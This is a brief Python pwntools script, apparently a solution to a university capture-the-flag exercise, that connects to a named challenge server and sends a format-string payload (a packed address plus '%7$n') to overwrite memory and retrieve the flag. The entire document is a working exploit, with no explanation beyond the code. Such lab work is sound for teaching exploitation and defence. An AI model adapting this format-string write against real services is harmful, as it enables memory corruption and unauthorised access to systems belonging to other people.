from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22192"

r = remote(SERVER,PORT)

msg = (b"\x40\xa0\x04\x08.%7$n")

r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()